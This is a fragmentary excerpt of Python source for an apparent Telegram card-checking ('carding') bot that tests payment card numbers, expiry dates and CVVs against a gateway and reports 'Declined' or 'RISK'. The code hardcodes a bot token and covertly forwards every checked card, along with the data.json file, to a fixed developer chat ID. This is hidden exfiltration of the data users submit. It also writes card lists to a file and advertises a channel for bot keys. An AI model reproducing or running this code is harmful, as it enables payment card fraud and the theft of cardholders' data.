...
tok='7393338570:AAEvdQAMta4PXBQwrZ5iUZFMqY258oP7ZNs'
chat_id = 5089141183
...
Declined ➜ {dd}
					...
					try:
						...
						print(er)
						bot.send_message(5089141183,er)
						last='Error'
...
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	...
	try:
		...
		if 'chk' == cmd or 'cc' == cmd or 'auth' == cmd or 'cvv' == cmd or 'x' == cmd or 'pro' == cmd:
			de=c()
			last = globals()[de](cc)
			bot.send_message(5089141183,f'{cc} {last} {de}')
			if 'RISK' in last or 'risk' in last:
...
Join <a href="t.me/tcrep1">Here</a> to Get Updates And Keys For The Bot

If You Want to Run a Bot In Your Group, Make Sure The Bot is The Admin 🎁</b>''', reply_markup=keyboard)
		with open('data.json', 'rb') as file:
			bot.send_document(5089141183, file)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["on","of"])
def start(message):
	try:
		if not message.from_user.id == 5089141183:
			return
...
Please make sure you entered the correct username. If you believe this is an error, please check the spelling and try again. If the issue persists, kindly reach out to our support team for further assistance.</b>''',parse_mode="HTML")
				...
				with open('𝐆𝐍𝐀𝐙𝐇 𝑩𝒀 𝑴𝑶3𝑮𝒁𝑨.txt', 'w') as file:
					file.write(ccs)
				end_time = time.time()
				execution_time = end_time - start_time
				ui=len(ccs)
...
𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹 ➜ <a href='https://t.me/{userdeve}'>𓆩𝐆𝐍𝐀𝐙𝐇𓆪</a>
